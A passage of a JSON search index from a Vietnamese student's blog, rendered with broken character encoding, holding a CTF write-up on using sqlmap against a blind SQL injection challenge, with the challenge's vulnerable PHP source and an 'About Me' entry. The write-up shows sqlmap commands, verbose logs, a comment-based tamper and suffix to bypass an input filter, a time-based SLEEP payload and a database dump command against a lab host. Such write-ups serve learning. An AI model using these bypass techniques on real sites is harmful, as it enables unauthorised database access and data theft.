báº£n giá»‘ng nhÆ° váº­y thÃ¬ sqlmap sáº½ hiá»ƒu cÃ¢u lá»‡nh Ä‘Ã³ Ä‘ang Ä‘Ãºng.\nCÃ¢u lá»‡nh:\nsqlmap -u http://192.168.19.89/test/index.php --data \u0026#34;search_user_exist\u0026amp;username=\\\u0026amp;name=OR/**/1=1#\u0026#34; --string=\u0026#34;User exist\u0026#34;   Váº«n k Ä‘Æ°á»£c, trong sqlmap cÃ³ option -v Ä‘á»ƒ xem Ä‘Æ°á»£c chi tiáº¿t cÃ¡c payload sá»­ dá»¥ng, request nhÆ° tháº¿ nÃ o, káº¿t quáº£ responce ra lÃ m sao. á» Ä‘Ã¢y mÃ¬nh sáº½ dÃ¹ng cáº¥p Ä‘á»™ thá»© 6 Ä‘á»ƒ kiá»ƒm tra káº¿t quáº£ mÃ  sqlmap Ä‘áº©y lÃªn Ä‘Ãºng chÆ°a.\nCÃ¢u lá»‡nh:\nsqlmap -u http://192.168.19.89/test/index.php --data \u0026#34;search_user_exist\u0026amp;username=\\\u0026amp;name=OR/**/1=1#\u0026#34; --string=\u0026#34;User exist\u0026#34; -v 6 [16:50:19] [PAYLOAD] OR/**/1=1#\u0026#39; AND 3190=DBMS_PIPE.RECEIVE_MESSAGE(CHR(69)||CHR(76)||CHR(103)||CHR(77),5) AND \u0026#39;gzMg\u0026#39;=\u0026#39;gzMg [16:50:19] [TRAFFIC OUT] HTTP request [#148]: POST /test/index.php HTTP/1.1 Host: 192.168.19.89 Accept-encoding: gzip,deflate Cache-control: no-cache Content-type: application/x-www-form-urlencoded; charset=utf-8 Accept: */* User-agent: sqlmap/1.3.7#stable (http://sqlmap.org) Content-length: 204 Connection: close search_user_exist\u0026amp;username=%5C\u0026amp;name=OR%2F%2A%2A%2F1%3D1%23%27%20AND%203190%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2876%29%7C%7CCHR%28103%29%7C%7CCHR%2877%29%2C5%29%20AND%20%27gzMg%27%3D%27gzMg [16:50:19] [TRAFFIC IN] HTTP response [#148] (200 OK): Date: Wed, 28 Aug 2019 09:50:19 GMT Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1c PHP/7.3.6 X-Powered-By: PHP/7.3.6 Content-Length: 14 Connection: close Content-Type: text/html; charset=UTF-8 URI: http://192.168.19.89:80/test/index.php h4x0r detected   Theo quan sÃ¡t thÃ¬ PAYLOAD Ä‘ang sai, sqlmap sá»­ dá»¥ng cáº£ OR/**/1=1# cá»§a name nÃªn nÃ³ bá»‹ sai, vÃ  space Ä‘ang Ä‘Æ°á»£c sá»­ dá»¥ng. BÃ¢y giá» mÃ¬nh pháº£i chuyá»ƒn táº¥t cáº£ space vá» /**/. á» sqlmap cÃ³ 1 tÃ¹y chá»n ráº¥t hay lÃ  tamper. Äá»ƒ hiá»ƒn thá»‹ danh sÃ¡ch cÃ¡c tamper cÃ³ trong sqlmap thÃ¬ sá»­ dá»¥ng cÃ¢u lá»‡nhluÃ´n. MÃ¬nh hoÃ n toÃ n cÃ³ thá»ƒ custom láº¡i tamper nÃ y cá»§a sqlmap.\nsqlmap --list-tampers   Tháº¥y cÃ³ * space2comment.py - Replaces space character (' ') with comments '/**/' nÃªn sá»­ dá»¥ng luÃ´n. Váº­y cÃ¢u lá»‡nh tiáº¿p theo sáº½ lÃ :\nsqlmap -u http://192.168.19.89/test/index.php --data \u0026#34;search_user_exist\u0026amp;username=\\\u0026amp;name=OR/**/1=1#\u0026#34; -p name --string=\u0026#34;User exist\u0026#34; --tamper=space2comment.py   Kiá»ƒm tra káº¿t quáº£ thÃ¬ váº«n chÆ°a Ä‘Æ°á»£c. CÃ¢u lá»‡nh query váº«n Ä‘ang sai. Do sqlmap ná»‘i luÃ´n OR/**/1=1# vÃ o payload nÃªn Ä‘ang bá»‹ sai. ChÃºng ta xÃ³a nÃ³ Ä‘i vÃ  tiáº¿n hÃ nh cháº¡y láº¡i.\nsqlmap -u http://192.168.19.89/test/index.php --data \u0026#34;search_user_exist\u0026amp;username=\\\u0026amp;name=OR/**/1=1#\u0026#34; -p name --string=\u0026#34;User exist\u0026#34; --tamper=space2comment.py   Váº«n chÆ°a Ä‘Æ°á»£c, kiá»ƒm tra láº¡i vá»›i option -v 6 thÃ¬ tháº¥y ráº±ng PAYLOAD Ä‘ang sá»­ dá»¥ng dáº¥u comment lÃ  dáº¥u --, mÃ¬nh pháº£i Ä‘á»•i dáº¥u -- thÃ nh dáº¥u #. Sá»­ dá»¥ng tÃ¹y chá»n --suffix=\u0026quot;#\u0026quot; thÃ¬ cuá»‘i má»—i PAYLOAD sáº½ lÃ  dáº¥u #.\nsqlmap -u http://192.168.19.89/test/index.php --data \u0026#34;search_user_exist\u0026amp;username=\\\u0026amp;name=OR/**/1=1#\u0026#34; -p name --string=\u0026#34;User exist\u0026#34; --tamper=space2comment.py --suffix=\u0026#34;#\u0026#34;` Parameter: name (POST) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: search_user_exist\u0026amp;username=\\\u0026amp;name= AND (SELECT 1987 FROM (SELECT(SLEEP(5)))ApsW)# --- [17:02:55] [WARNING] changes made by tampering scripts are not included in shown payload content(s) [17:02:55] [INFO] the back-end DBMS is MySQL web application technology: Apache 2.4.39, PHP 7.3.6 back-end DBMS: MySQL \u0026gt;= 5.0.12    ÄÃ£ hoáº¡t Ä‘á»™ng rá»“i. DB sá»­ dá»¥ng MySQL, giá» chÃºng ta sá»­ dá»¥ng lá»‡nh --dump-all láº¥y tÃªn DB vÃ  Table cá»§a dá»¯ liá»‡u ta cáº§n láº¥y.\nsqlmap -u http://192.168.19.89/test/index.php --data \u0026quot;search_user_exist\u0026amp;username=\\\u0026amp;name=\u0026quot; -p name --string=\u0026quot;User exist\u0026quot; --suffix=\u0026quot;#\u0026quot; --tamper=space2comment.py --dbms=mysql -D --dumpall-all   CÃ³ thá»ƒ sá»­ dá»¥ng cÃ¡c tÃ¹y chá»n khÃ¡c Ä‘á»ƒ láº¥y dá»¯ liá»‡u tá»« tá»« nhÆ° --current-db chá»n cÃ¡c dá»¯ liá»‡u mong muá»‘n Ä‘á»ƒ láº¥y ra ngoÃ i. D\n  Káº¿t luáº­n  sqlmap ráº¥t máº¡nh, háº§u nhÆ° cÃ³ thá»ƒ táº¥n cÃ´ng vÃ o báº¥t cá»© web nÃ o cÃ³ dÃ­nh lá»—i SQL Injection. VÃ i Ä‘iá»u lÆ°u Ã½: Náº¿u sá»­ dá»¥ng sqlmap mÃ  k tháº¥y ra káº¿t quáº£ thÃ¬ sá»­ dá»¥ng option -v Ä‘á»ƒ xem PAYLOAD truyá»n vÃ o Ä‘Ãºng Ã½ mÃ¬nh chÆ°a. KiÃªn trÃ¬ thÃ¬ sáº½ hÃ¡i Ä‘Æ°á»£c quáº£ ngá»t :D  ","permalink":"https://minhtuanact.github.io/content/post/su-dung-cong-cu-sqlmap-voi-blind-sql-injection-cho-1-bai-ctf/","summary":"Má»Ÿ Ä‘áº§u  Vá»«a rá»“i cÃ³ 1 cuá»™c thi KMA CTF dÃ nh cho sinh viÃªn. MÃ¬nh cÅ©ng Ä‘Æ°á»£c tiáº¿p xÃºc vá»›i 1 bÃ i Web dÃ­nh SQL Injection  Äá» bÃ i \u0026lt;?php include \u0026#34;config.php\u0026#34;; function check_input($input) { $charset = \u0026#34;~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026amp;\\()*+,-./:;\u0026lt;=\u0026gt;?@[]^_`{|}\u0026#34;; if (empty($input)) return false; for ($i = 0 ; $i \u0026lt; strlen($input); $i++) if(!strpos($charset,$input[$i])) return false; return true; } if(isset($_POST[\u0026#34;search_user_exist\u0026#34;])) { $username = $_POST[\u0026#34;username\u0026#34;]; $name = $_POST[\u0026#34;name\u0026#34;]; \u0026#34;hl_lines=5-6\u0026#34; if ( check_input($username) === false || check_input($name) === false) { die(\u0026#34;h4x0r detected\u0026#34;); } $sql = \u0026#34;SELECT id FROM users WHERE username=\u0026#39;$username\u0026#39; or name=\u0026#39;$name\u0026#39;\u0026#34;; $result = $conn-\u0026gt;query($sql); if ($result-\u0026gt;num_rows \u0026gt; 0) { die(\u0026#34;User exist\u0026#34;); } die(\u0026#34;No user\u0026#34;); } else { highlight_file(__FILE__); } ?","title":"Sá»­ Dá»¥ng CÃ´ng Cá»¥ SQLMAP vá»›i Blind SQL Injection Cho 1 BÃ i CTF"},{"content":"About Me Há»c váº¥n  Sinh viÃªn nÄƒm 5 táº¡i Há»c viá»‡n Ká»¹ thuáº­t Máº­t MÃ£ (KMA)  QuÃª QuÃ¡n  Sinh ra vÃ  lá»›n lÃªn táº¡i miá»n quÃª Báº¯c Giang yÃªu dáº¥u  Sá»Ÿ thÃ­ch  ThÃ­ch ráº¥t nhiá»u thá»© má»—i thá»© 1 chÃºt ThÃ­ch Äƒn nhiá»u thá»© (thÃ nh ra giá» má»›i bÃ©o váº­y náº§y T_T) ThÃ­ch Ä‘i Ä‘Ã¢y Ä‘i Ä‘Ã³ ThÃ­ch Ä‘i xem phim nhÆ°ng k thÃ­ch Ä‘i xem phim 1 mÃ¬nh ThÃ­ch nghe nháº¡c: pop ballad, indie, rock ballad, \u0026hellip; ThÃ­ch tá»± do  ","permalink":"https://minhtuanact.github.io/content/about/","summary":"About Me Há»c váº¥n  Sinh viÃªn nÄƒm 5 táº¡i Há»c viá»‡n Ká»¹ thuáº­t Máº­t MÃ£ (KMA)  QuÃª QuÃ¡n  Sinh ra vÃ  lá»›n lÃªn táº¡i miá»n quÃª Báº¯c Giang yÃªu dáº¥u  Sá»Ÿ thÃ­ch  ThÃ­ch ráº¥t nhiá»u thá»© má»—i thá»© 1 chÃºt ThÃ­ch Äƒn nhiá»u thá»© (thÃ nh ra giá» má»›i bÃ©o váº­y náº§y T_T) ThÃ­ch Ä‘i Ä‘Ã¢y Ä‘i Ä‘Ã³ ThÃ­ch Ä‘i xem phim nhÆ°ng k thÃ­ch Ä‘i xem phim 1 mÃ¬nh ThÃ­ch nghe nháº¡c: pop ballad, indie, rock ballad, \u0026hellip; ThÃ­ch tá»± do  ","title":"About"}]